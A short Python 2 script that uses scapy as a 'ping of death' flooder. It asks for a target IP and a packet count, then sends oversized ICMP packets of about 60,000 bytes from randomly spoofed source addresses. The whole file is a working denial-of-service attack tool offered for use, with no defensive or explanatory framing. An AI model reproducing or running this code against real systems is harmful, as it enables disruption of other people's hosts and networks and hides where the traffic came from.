from scapy.all import *
import socket,sys,threading,random

print '##############################################'
print '#PING OF FLOOD - A Multithreaded PING FLOODER#'
print '#\t\tAuthor: VinhNgo \t     #'
print '##############################################'
class PING(threading.Thread):
        def __init__(self,target,MESSAGE,packets):
                threading.Thread.__init__(self)
		self.target = target
		self.MESSAGE = MESSAGE
		self.packets = packets

	def addr_rand(self):
		addr = [192, 168, 0 , 1]
		d = '.'
		addr[0] = str(random.randrange(11,197))
		addr[1] = str(random.randrange(0,255))
		addr[2] = str(random.randrange(0,255))
		addr[3] = str(random.randrange(2,254))
		addr_random = addr[0]+d+addr[1]+d+addr[2]+d+addr[3]
		return addr_random 
       
	def run(self):
		ip = IP(src=self.addr_rand(),dst=self.target)
		packet = ip/ICMP()/(self.MESSAGE*60000)
		send(packet,count=self.packets)
		print "Ping of death complete!"

def PINGFlood():
	target = raw_input("Target IP: ")
	MESSAGE = "V"
	packets = int(raw_input("Enter number of packets: "))
	print 'Flooding {} with PING OF DEATH packets.'.format(target)
	pingFlood = PING(target,MESSAGE,packets)	
	pingFlood.start()

PINGFlood()	
